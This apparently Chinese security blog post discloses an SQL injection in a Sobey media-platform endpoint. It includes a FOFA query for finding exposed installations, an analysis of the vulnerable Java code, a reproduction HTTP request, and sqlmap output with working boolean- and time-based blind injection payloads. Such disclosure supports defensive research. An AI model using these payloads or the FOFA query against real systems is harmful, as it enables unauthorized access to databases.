---
title: "索贝融媒体 /sobey-mchEditor/tianma/op SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-tianma-op-ids-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditortianmaop-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/tianma/op SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/17 08:18
* 721浏览
* [0评论](#comment)
* 31分钟阅读

深入探索

SQL

软件

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/tianma/op 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入检测工具

# 影响版本

# fofa语法

> app="SOBEY-融媒体"

# 漏洞分析

深入探索

漏洞修复方案

防火墙软件

身份验证

看下存在漏洞的`op`方法是如何实现的吧

```
@RequestMapping({"/op"})
public Response getColumns(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("ids") String ids, @RequestParam("opstatus") String opstatus, @RequestParam(value = "ifSetField",required = false,defaultValue = "true") Boolean ifSetField) {
    if (StringUtils.isEmpty(ids)) {
        return Response.paramError("所选稿件不能为空");
    } else {
        String opName = this.getOpName(opstatus);
        if (StringUtils.isEmpty(opName)) {
            return Response.paramError("操作未识别");
        } else {
            List<String> articleids = Arrays.asList(ids.split(","));
            QueryBuilder queryBuilder = new QueryBuilder("SELECT a.id ,c.prop1 FROM zccatalog c INNER JOIN zcnarticle a on a.catalogid =  c.id where 1=1 and c.prop1 like '%\\\"tianmaApiUrl\\\"%' ");
            SchemaSQLUtil.appendInCondition(queryBuilder, "a.id", articleids);
            List<Map<String, Object>> rows = queryBuilder.executeAliasListMap();
```

深入探索

安全研究工具

网络安全培训

安全

参数 ids 使用逗号分割后的数组`articleids`被带入`appendInCondition`方法中

```
public static <T> void appendInCondition(QueryBuilder queryBuilder, String colomnName, Collection<T> values) {
    StringBuffer sqlbuffer = new StringBuffer(queryBuilder.getSQL());
    appendInCondition(sqlbuffer, colomnName, values);
    queryBuilder.setSQL(sqlbuffer.toString());
}
```

然后又被带入`appendInCondition`方法中

```
public static <T> void appendInCondition(StringBuffer sqlbuffer, String colomnName, Collection<T> values) {
    appendInCondition(sqlbuffer, colomnName, values, false);
}

public static <T> void appendInCondition(StringBuffer sqlbuffer, String colomnName, Collection<T> values, boolean or) {
    if (!or) {
        sqlbuffer.append(String.format(" and %s in (", colomnName));
    } else {
        sqlbuffer.append(String.format(" or %s in (", colomnName));
    }

    int num = values.size();

    for(T value : values) {
        sqlbuffer.append(String.format(" '%s' ", value.toString()));
        --num;
        if (num > 0) {
            sqlbuffer.append(",");
        }
    }

    sqlbuffer.append(") ");
}
```

到这里就很清楚明了了，**ids**经过一些列的分割传参后，是被直接拼接在in子语句中，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，由于 **ids** 参数被逗号分割处理，且每个部分被单引号包围并插入到 IN 子句中，因此注入 `payload` 必须作为一个单一值（无逗号），通过闭合引号和括号来 `breakout`，然后添加延时条件，最后使用注释符屏蔽剩余部分。

代码安全审计

# 漏洞复现

```
POST /sobey-mchEditor/js/%2e%2e/tianma/op HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

opstatus=up&siteCode=1&token=1&ids=1')SQLI_POC-- -
```

[![索贝融媒体 /sobey-mchEditor/tianma/op SQL注入漏洞](images/img-001-cad7527f278d.webp)](https://image.mrxn.net/6a579ece79614155bb97ec5719948c9a.webp)

成功延时 5 秒

漏洞预警服务

[SQLMAP](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: opstatus=up&siteCode=1&token=1&ids=1') OR NOT 2685=2685#

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: opstatus=up&siteCode=1&token=1&ids=1') OR (SELECT 8771 FROM (SELECT(SLEEP(5)))WWVB)-- QTWL
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#sqlmap](https://mrxn.net/tag/sqlmap)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/tianma/op SQL注入漏洞](https://mrxn.net/jswz/sobey-tianma-op-ids-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-tianma-op-ids-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

编程

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-tianma-op-ids-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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